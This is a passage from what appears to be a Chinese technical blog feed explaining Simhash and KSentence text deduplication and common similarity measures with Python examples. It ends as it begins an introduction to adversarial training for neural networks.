<p>分词后计算词汇哈希：对文档进行分词处理，统计各词汇的词频，以字典形式表示即为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><mo>:</mo><mi>c</mi><mi>o</mi><mi>u</mi><mi>n</mi><mi>t</mi><mi>s</mi><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\left\{ word: counts \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">s</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span> 。通过<strong>哈希函数</strong>，将词汇从字符串形式转换为长度为 N 的01形式的向量，以字典形式表示即为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mo>[</mo><mn>01</mn><mo>]</mo><mrow><mo fence="true">{</mo><mi>N</mi><mo fence="true">}</mo></mrow><mo>:</mo><mi>c</mi><mi>o</mi><mi>u</mi><mi>n</mi><mi>t</mi><mi>s</mi><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\left\{ [01]\left\{ N \right\}: counts \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mopen">[</span><span class="mord">0</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">s</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span> 。</p>
</li>
<li>
<p>计算Simhash特征向量：将词汇哈希中的 0 映射为 -1 ，然后与词频按位相乘，得到的词汇特征向量集可以表示为 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo fence="true">{</mo><mo>[</mo><mi>I</mi><mo>(</mo><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><mn>1</mn><mo>)</mo><mo>−</mo><mi>I</mi><mo>(</mo><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><mn>0</mn><mo>)</mo><mo>]</mo><mo>∗</mo><mi>c</mi><mi>o</mi><mi>u</mi><mi>n</mi><mi>t</mi><mi>s</mi><mi mathvariant="normal">∣</mi><mi>n</mi><mo>∈</mo><mrow><mo fence="true">(</mo><mn>1</mn><mo separator="true">,</mo><mi>N</mi><mo fence="true">)</mo></mrow><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\left\{ [I(x_{n}=1)-I(x_{n}=0)]*counts | n\in\left( 1,N \right) \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mord mathdefault">s</span><span class="mord">∣</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span> 。设文档共有 M 个词汇，将这M个词汇的 N 维特征向量按行拼接，，则得到一个 M*N 的矩阵。对这个矩阵按列进行求和，得到一个 N 维行向量，再对这个行向量按位进行 I(y_{n}&gt;0) 变换，即正数映射为1，负数映射为0，最后的结果就是这个文档的simhash特征向量。</p>
</li>
<li>
<p>建立分段索引，提取潜在相似文本对：Simhash采用Hamming距离衡量文本相似度，Hamming距离小于等于 K 的文本对，认为是重复文本。<strong>根据抽屉原理，若将Simhash分为K+1段，则重复文本必有一段取值相同</strong>。与Minhash类似，可以将同一索引值下的文本两两组合，作为潜在相似文本对。</p>
</li>
<li>
<p>计算潜在相似文本对的Hamming距离：两个Simhash向量按位异或之后取值为1的个数即为两个文本的距离 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>a</mi><mi>n</mi><mi>c</mi><mi>e</mi><mo>=</mo><msubsup><mo>∑</mo><mrow><mi>n</mi><mo>=</mo><mn>1</mn></mrow><mi>N</mi></msubsup><mrow><mi>I</mi><mo>(</mo><msub><mi>x</mi><mi>n</mi></msub><mo>=</mo><msub><mi>y</mi><mi>n</mi></msub><mo>)</mo></mrow></mrow><annotation encoding="application/x-tex">distance=\sum_{n=1}^{N}{I(x_{n}=y_{n})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.2809409999999999em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.981231em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 。当距离小于等于指定阈值时，可认为两个文本为重复文本。</p>
</li>
</ol>
<h2 id="二算法分析-3">（二）算法分析</h2>
<p><strong>1. 哈希函数</strong></p>
<p>这里的哈希函数是指将词汇哈希为01向量的函数。个人认为这个哈希函数应该具有两个特征：</p>
<p>一是哈希结果中的0和1尽量均匀地分布，否则在分段索引时，很容易造成某一段文本数量爆炸的情况。例如将词汇哈希为64维01向量时，采用高(低)位补零的策略，就会导致分段后高(低)位全为0的这个索引下有几乎全量的文本，无法达到缩小潜在相似文本范围的目的。</p>
<p>二是哈希结果最好能使相似词汇具有相近的哈希值，如果能做到那也是一个局部敏感哈希。</p>
<p><strong>2. Simhash准确率低于Minhash</strong></p>
<p>一是Simhash对文本进行分词处理并统计词频，可以认为是一个词袋模型，并没有考虑词汇的先后顺序。Minhash采用滑动窗口提取词组，加入了词汇次序信息。</p>
<p>二是Simhash对词汇特征向量按列求和再做符号映射，丢失了文本特征信息。</p>
<h2 id="四-ksentence算法"><strong>四、KSentence算法</strong></h2>
<p>KSentence算法基于一个朴素的假设：两个重复文本中，最长的K个句子应该是完全一样的。</p>
<h2 id="一算法步骤-4">（一）算法步骤</h2>
<p>1.预处理：读取文档数据集，根据需求，对文档中的中英文、简繁体等字符进行清洗和整理。</p>
<p>2.提取语句：根据标点、换行符等划分语句，统计语句长度</p>
<p>3.计算指纹：拼接最长的 K 个语句，计算MD5值作为文本指纹</p>
<p>4.文本去重：根据文本指纹，过滤重复文本</p>
<h2 id="二算法分析-4">（二）算法分析</h2>
<p>关于KSentence算法的几点注解如下：</p>
<p>1.KSentence算法的假设很严格，实验结果显示，KSentence算法准确率较高，召回率低于Minhash和Simhash。</p>
<p>2.算法实现简单，计算效率高，很容易并行化。算法对于具有固定格式的模板类文档具有很好的辨识能力，但对于抄袭后进行部分修改的文本识别度较低。</p>
<h2 id="五-总结"><strong>五、总结</strong></h2>
<p><strong>1. 算法步骤</strong></p>
<figure data-type="image" tabindex="2"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/v2-2a0a24f587b811ba28b334a374830080_1440w-20230504162435681-20230504162623820.webp" alt="img" loading="lazy"></figure>
<p>四类算法步骤对比</p>
<p><strong>2. 算法评估</strong></p>
<p>实验对比Minhash、Simhash、KSentence的性能，结果如下：</p>
<p>运行速度：KSentence &gt; Simhash &gt; Minhash</p>
<p>准确率：KSentence &gt; Minhash &gt; Simhash</p>
<p>召回率：Simhash &gt; Minhash &gt; KSentence</p>
<p>工程应用上，海量文本用Simhash，短文本用Minhash，追求速度用KSentence。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[各种相似距离]]></title>
        <id>https://johnyin-hub.github.io/post/ge-chong-xiang-si-ju-chi/</id>
        <link href="https://johnyin-hub.github.io/post/ge-chong-xiang-si-ju-chi/">
        </link>
        <updated>2023-02-07T18:14:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="余弦相似度-cosine-similarity">余弦相似度 cosine similarity</h1>
<p>向量a ，b的余弦相似度</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>⋅</mo><mi>b</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">a\cdot b =
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.44445em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span></span></p>
<img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/image-20230310110307134.png" alt="image-20230310110307134" style="zoom:33%;" />
<img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/image-20230310110329588.png" alt="image-20230310110329588" style="zoom:50%;" />
<pre><code class="language-python"># numpy
import numpy as np
vec1 = np.array([1, 2, 3, 4])
vec2 = np.array([5, 6, 7, 8])

cos_sim = vec1.dot(vec2) / (np.linalg.norm(vec1) * np.linalg.norm(vec2))
print(cos_sim)

#scipy
from scipy import spatial
vec1 = [1, 2, 3, 4]
vec2 = [5, 6, 7, 8]
cos_sim = 1 - spatial.distance.cosine(vec1, vec2)
print(cos_sim)

#torch
import torch
import torch.nn.functional as F

vec1 = torch.FloatTensor([1, 2, 3, 4])
vec2 = torch.FloatTensor([5, 6, 7, 8])

cos_sim = F.cosine_similarity(vec1, vec2, dim=0)
print(cos_sim) 
</code></pre>
<h1 id="汉明距离-hamming-distance">汉明距离 Hamming distance</h1>
<p>在<a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E6%81%AF%E8%AE%BA">信息论</a>中，两个等长<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>之间的<strong>汉明距离</strong>（英语：Hamming distance）是两个字符串对应位置的不同字符的个数。换句话说，它就是将一个字符串变换成另外一个字符串所需要<em>替换</em>的字符个数。</p>
<p>**<a href="https://zh.wikipedia.org/wiki/%E6%B1%89%E6%98%8E%E9%87%8D%E9%87%8F">汉明重量</a>**是字符串相对于同样长度的零字符串的汉明距离，也就是说，它是字符串中非零的元素个数：对于<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a><a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>来说，就是1的个数，所以11101的汉明重量是4。</p>
<pre><code class="language-python"> def Hamming_similarity(hash1,hash2): 
     num = 0
     for index in range(len(hash1)): 
         if hash1[index] != hash2[index]: 
             num += 1
     similarity = 1 - (num * 1.0) / (137*35) 
     return similarity
</code></pre>
<h1 id="编辑距离-levenshtein">编辑距离 Levenshtein</h1>
<p>编辑距离,也叫莱文斯坦距离(Levenshtein),是针对二个<a href="https://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>（例如英文字）的差异程度的量化量测，量测方式是看至少需要多少次的处理才能将一个字符串变成另一个字符串。</p>
<img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/image-20230323111842668.png" alt="image-20230323111842668" style="zoom:50%;" />
<pre><code class="language-python"># 构建二维距离矩阵动态求解
class Solution:
    def minDistance(self, word1: str, word2: str) -&gt; int:

        m, n = len(word1), len(word2)
        if m * n == 0:      # word1或word2为空 
            return m + n
        
        dp = [[0]*(n+1) for _ in range(m+1)]

        # 边界状态
        for i in range(1, m+1):
            dp[i][0] = i
        for j in range(1, n+1):
            dp[0][j] = j

        # 状态更新
        for i in range(1, m+1):
            for j in range(1, n+1):
                if word1[i-1] == word2[j-1]:
                    dp[i][j] = dp[i-1][j-1]
                else:
                    dp[i][j] = min(dp[i][j-1], dp[i-1][j], dp[i-1][j-1]) + 1
        
        return dp[m][n]
</code></pre>
<pre><code class="language-python"># 使用一维的滚动数组求解
class Solution:
    def minDistance(self, word1: str, word2: str) -&gt; int:

        m, n = len(word1), len(word2)
        if m * n == 0:
            return m + n
        
        dp = [0] * (n+1)

        # 边界状态
        for j in range(1, n+1):
            dp[j] = j
        
        # 状态更新
        for i in range(1, m+1):
            dp2 = [0] * (n+1)   # 滚动数组
            dp2[0] = i
            for j in range(1, n+1):
                if word1[i-1] == word2[j-1]:
                    dp2[j] = dp[j-1]
                else:
                    dp2[j] = min(dp2[j-1]+1, dp[j]+1, dp[j-1]+1)
            dp = dp2        # 滚动数组
            
        return dp[n]

</code></pre>
<h1 id="杰卡德距离-jaccard-similarity">杰卡德距离 Jaccard similarity</h1>
<p>给定两个集合A,B，Jaccard 系数定义为A与B交集的大小与A与B并集的大小的比值，定义如下：</p>
<figure data-type="image" tabindex="1"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/8ef3fad30cdb2d41ff1fe82d54bacbf6-20230504142148693.svg" alt="img" loading="lazy"></figure>
<p>当集合A，B都为空时，J(A,B)定义为1。</p>
<p>与Jaccard 系数相关的指标叫做Jaccard 距离，用于描述集合之间的不相似度。Jaccard 距离越大，样本相似度越低。公式定义如下：</p>
<figure data-type="image" tabindex="2"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/bf43d7abc9dedf0a963f752a2e544ef5-20230504142148709.svg" alt="img" loading="lazy"></figure>
<p>其中对称差（symmetric difference）</p>
<figure data-type="image" tabindex="3"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/27bf5aadc0f6d9c1bd292101732038ed-20230504142148723.svg" alt="img" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/fc235100e0242564eb9bd853fa9ed556-20230504142148739.svg" alt="img" loading="lazy"></figure>
<pre><code class="language-python"># Jaccard similarity coefficient
def jaccard_similarity(x, y):
    intersection_cardinality = len(set.intersection(*[set(x), set(y)]))
    union_cardinality = len(set.union(*[set(x), set(y)]))
    return intersection_cardinality / float(union_cardinality)
</code></pre>
<p>广义Jaccard系数</p>
<p>（1）给定两个n维向量 则 Jaccard 系数定义如下：</p>
<figure data-type="image" tabindex="5"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/4666556e10f2290fc7f3951238b41d89.svg" alt="img" loading="lazy"></figure>
<p>（2）给定两个关于 的非负函数 <strong>f</strong> 和 <strong>g</strong> ，则 Jaccard 系数定义如下：</p>
<figure data-type="image" tabindex="6"><img src="https://johnyin.oss-cn-shanghai.aliyuncs.com/uPic/cef13809ac0da8b772f32b7858f578db.svg" alt="img" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[聊一聊对抗训练]]></title>
        <id>https://johnyin-hub.github.io/post/liao-yi-liao-dui-kang-xun-lian/</id>
        <link href="https://johnyin-hub.github.io/post/liao-yi-liao-dui-kang-xun-lian/">
        </link>
        <updated>2022-08-17T16:50:16.000Z</updated>
        <content type="html"><![CDATA[<h2 id="对抗训练">对抗训练</h2>
<h3 id="深度学习中的对抗">深度学习中的对抗：</h3>
<ul>
<li>生成对抗网络（Generative Adversarial Network）</li>
<li>对抗攻击、对抗样本领域</li>
</ul>
<h3 id="现实案例">现实案例：</h3>
<p><strong>微软通过RoBERTa</strong>+对抗训练在GLUE上超过了原生RoBerta。</p>
<h3 id="min-max">Min-Max</h3>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><munder><mo><mi mathvariant="normal">min</mi><mo>⁡</mo></mo><mi>θ</mi></munder><msub><mi>E</mi><mrow><mo>(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>)</mo><mo>∼</mo><mi>D</mi></mrow></msub><mo>[</mo><munder><mo><mi mathvariant="normal">max</mi><mo>⁡</mo></mo><mrow><mi mathvariant="normal">Δ</mi><mo>∈</mo><mi mathvariant="normal">Ω</mi></mrow></munder><mi>L</mi><mo>(</mo><mi>x</mi><mo>+</mo><mi mathvariant="normal">Δ</mi><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">;</mo><mi>θ</mi><mo>)</mo><mo>]</mo></mrow><annotation encoding="application/x-tex">\underset {\theta}{\operatorname{min}}E_{(x,y)\sim D}[\underset{\Delta\in\Omega}{\operatorname{max}}L(x+\Delta x,y;\theta)]
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.521701em;vertical-align:-0.771701em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-2.347892em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">θ</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop"><span class="mord mathrm">m</span><span class="mord mathrm">i</span><span class="mord mathrm">n</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7521079999999999em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">x</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mrel mtight">∼</span><span class="mord mathdefault mtight" style="margin-right:0.02778em;">D</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mopen">[</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.43055999999999994em;"><span style="top:-2.355669em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">Δ</span><span class="mrel mtight">∈</span><span class="mord mtight">Ω</span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop"><span class="mord mathrm">m</span><span class="mord mathrm">a</span><span class="mord mathrm">x</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.771701em;"><span></span></span></span></span></span></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span><span class="mclose">]</span></span></span></span></span></p>
<p>​		<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi></mrow><annotation encoding="application/x-tex">D</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span></span></span></span>：训练集	<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span> : 模型参数	<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>L</mi><mo>(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo separator="true">;</mo><mi>θ</mi><mo>)</mo></mrow><annotation encoding="application/x-tex">L(x,y;\theta)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">L</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mclose">)</span></span></span></span> : 单个样本loss</p>
<p>​		<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">\Delta x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span></span></span></span> : 对抗扰动（常规约束：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">Δ</mi><mi>x</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">||\Delta x||\leq \epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord">Δ</span><span class="mord mathdefault">x</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span>   <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding="application/x-tex">\epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span></span></span></span> 是一个常数）	<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Ω</mi></mrow><annotation encoding="application/x-tex">\Omega</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Ω</span></span></span></span> : 是扰动空间</p>
<p>**具体目的：**往训练集注入扰动<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">\Delta x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span></span></span></span> 构造对抗样本，使用对抗样本去最小化loss来更新参数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi></mrow><annotation encoding="application/x-tex">\theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span></span></span></span></p>
<p><strong>重点：</strong></p>
<h4 id=""></h4>
<h3 id="快速梯度法fast-gradient-method">快速梯度法（Fast Gradient Method）</h3>
<ol>
<li>
<p>取<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">Δ</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">\Delta x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span><span class="mord mathdefault">x</span></span></span></span>的方法：</p>
